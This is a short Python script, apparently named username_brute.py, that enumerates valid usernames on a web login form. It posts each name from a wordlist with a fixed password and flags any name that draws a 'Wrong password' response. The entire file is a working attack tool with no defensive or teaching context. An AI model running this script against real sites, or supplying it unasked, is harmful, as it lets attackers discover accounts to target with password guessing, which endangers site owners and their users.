import requests
import sys

def brute_usernames(url, wordlist_path):
    with open(wordlist_path, 'r') as file:
        usernames = [line.strip() for line in file if line.strip()]

    print(f"[+] Loaded {len(usernames)} usernames from {wordlist_path}")
    print("[*] Starting brute-force...\n")

    for username in usernames:
        data = {
            'username': username,
            'password': 'password'
        }

        try:
            response = requests.post(url, data=data, timeout=5)

            if "Wrong password" in response.text:
                print(f"[+] Valid username found: {username}")
            elif "Wrong username or password" not in response.text:
                continue
        except requests.RequestException as e:
            print(f"[!] Request error with {username}: {e}")
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user.")
            break

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 username_brute.py <url> <wordlist>")
        sys.exit(1)

    target_url = sys.argv[1]
    wordlist_file = sys.argv[2]

    brute_usernames(target_url, wordlist_file)
